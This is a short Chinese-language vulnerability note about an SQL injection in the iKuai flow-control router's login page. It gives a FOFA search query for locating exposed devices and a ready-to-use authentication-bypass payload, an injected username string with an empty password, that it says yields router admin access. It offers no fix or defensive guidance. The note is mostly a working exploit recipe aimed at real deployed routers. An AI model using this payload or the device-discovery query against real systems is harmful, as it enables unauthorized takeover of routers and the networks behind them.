# iKuai 流控路由 SQL注入漏洞

# 一、漏洞简介
iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限。

# 二、影响版本
+ iKuai 流控路由

# 三、资产测绘
+ fofa`title="登录爱快流控路由"`
+ 特征

![1708141838923-2e73c81d-9305-4108-a974-55314dbcd36f.png](./img/YBuf94WmdVDpk4Za/1708141838923-2e73c81d-9305-4108-a974-55314dbcd36f-143487.png)

# 四、漏洞复现
使用万能密码登陆系统

```java
user: "or""=""or""="
pass: 空
```

![1708141888537-0e90ab4f-9fcc-4f83-9bb5-3b00d2207213.png](./img/YBuf94WmdVDpk4Za/1708141888537-0e90ab4f-9fcc-4f83-9bb5-3b00d2207213-683464.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kx86t3hwzf40pktl>